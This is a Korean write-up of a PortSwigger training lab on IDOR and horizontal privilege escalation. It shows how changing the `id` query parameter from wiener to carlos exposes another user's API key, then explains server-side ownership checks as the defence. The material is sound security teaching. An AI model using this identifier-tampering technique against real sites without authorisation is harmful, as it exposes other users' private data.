# Lab: User ID controlled by request parameter

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — 수평적 권한 상승 / IDOR / 쿼리 파라미터 `id` 변조
- **링크**: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

## 목표

계정 페이지의 `id` 파라미터를 다른 사용자 이름으로 바꿔 `carlos` 의 API 키를 획득하고, 이를 제출한다.

- 계정: `wiener:peter`

## 이전 랩(001~004)과의 차이

```
[001~004 — Vertical (수직적) 권한 상승]
  일반 사용자가 관리자(상위 등급) 기능에 접근
  → /admin, 역할(roleid/Admin) 조작

[005 — Horizontal (수평적) 권한 상승 (이번)]
  같은 등급의 "다른 사용자" 리소스에 접근
  → wiener 가 carlos 의 계정 페이지/API 키 조회
```

## 수평적 권한 상승과 IDOR

### 수평적 권한 상승

```
같은 등급의 사용자 간 권한 경계가 무너지는 것
  A 사용자가 B 사용자의 데이터/기능에 접근

예:
  계좌 조회, 주문 내역, 프로필, API 키 등
```

### IDOR (Insecure Direct Object Reference)

```
사용자 입력이 리소스를 "직접" 가리키고,
그 입력을 변조해 권한 없는 객체에 접근하는 취약점

  GET /my-account?id=wiener
                    └──────┘ 사용자가 직접 제어하는 객체 참조
```

이번 랩은 IDOR + 수평적 권한 상승의 교과서적 예시다.

## 취약 지점

### 계정 페이지의 id 파라미터

```
GET /my-account?id=wiener HTTP/1.1
Cookie: session=<wiener 로그인 세션>
```

- 서버는 세션으로 "로그인한 사용자" 를 식별하지만,
- 어떤 계정을 보여줄지는 `id` 파라미터 값에 따라 결정한다.
- 즉 **인증은 되었으나, 인가(본인 리소스인지) 검사가 없다.**

```
정상 의도:
  id 가 세션 사용자와 일치하는지 검사

실제 동작 (취약):
  id 값으로 계정을 조회해 그대로 반환
  → id=carlos 로 바꾸면 carlos 의 계정 정보 반환
```

## 공격 단계

### 1단계 — 로그인 후 계정 페이지 확인

`wiener:peter` 로 로그인하고 `/my-account` 로 이동한다.

```
GET /my-account?id=wiener HTTP/1.1
Cookie: session=...
```

응답에 wiener 의 계정 정보(이메일, API 키 등)가 표시된다.
URL 에 `id=wiener` 가 포함된 것을 확인한다.

### 2단계 — id 파라미터를 carlos 로 변조

요청을 Burp Repeater 로 보내 `id` 값을 바꾼다.

```
GET /my-account?id=carlos HTTP/1.1
Cookie: session=<wiener 세션>
```

### 3단계 — carlos 의 API 키 획득

응답에 carlos 의 계정 정보가 반환된다.

```html
<div id="account-content">
  <p>Your username is: carlos</p>
  <p>Your email is: carlos@...net</p>
  <div>Your API Key is: <span>...</span></div>
</div>
```

API 키를 확인한다.

### 4단계 — API 키 제출

`Submit solution` 에 carlos 의 API 키를 입력해 랩 해결.

## 세션과 파라미터의 불일치

```
[요청 구성]
  인증 정보 : Cookie: session=<wiener>
  대상 지정 : GET /my-account?id=carlos

[서버가 해야 할 일]
  "세션 사용자(wiener)와 요청 대상(carlos)이 같은가?" 검사
  → 불일치하면 403

[서버의 실제 동작]
  세션은 인증에만 사용하고,
  대상은 id 파라미터로 결정 → carlos 정보 반환
```

## 방어

```
[근본 원인]
  리소스 소유자 검증 없이 사용자 입력(id)으로 객체를 조회

[올바른 방어]
  1. 리소스 접근 시 소유자 검증
     - 세션 사용자 ID 와 요청 대상 ID 를 비교
     - 다르면 403 Forbidden (또는 404)
  2. 가능하면 id 파라미터를 제거하고 세션에서만 사용자 식별
     GET /my-account          (세션 기반)
  3. 추측 불가능한 식별자를 "보안 수단" 으로만 의존하지 않음
     - GUID 라도 노출되면 접근 가능 (006 랩 참고)
  4. 서버 측 인가를 모든 리소스 엔드포인트에 일관 적용

[안티패턴]
  id 파라미터를 그대로 신뢰
  "관리자만 이 페이지 링크를 본다" 는 UI 수준 통제에 의존
```

## 핵심 정리

- `/my-account?id=wiener` 의 `id` 를 `carlos` 로 바꿔 타 사용자의 API 키와 이메일을 획득했다.
- 인증(로그인)은 되어 있었지만 리소스 소유자 검증이 없어 수평적 권한 상승이 발생했다.
- 사용자 입력이 리소스를 직접 참조하는 전형적인 IDOR 취약점이다.
- 방어는 세션 사용자와 대상 리소스 소유자를 비교하는 서버 측 인가 검사다.

## 배운 점

- 인증(Authentication)이 있어도 인가(Authorization)가 없으면 타인 리소스에 접근할 수 있다.
- 접근 제어 취약점을 찾을 때는 요청의 "대상 식별자" (id, username, uid 등)를 변조해 보는 것이 기본이다.
- 다음 랩(006)은 식별자가 GUID 라 예측이 어려운 경우, 007/008 은 리다이렉트·비밀번호 노출을 통한 확장 사례다.
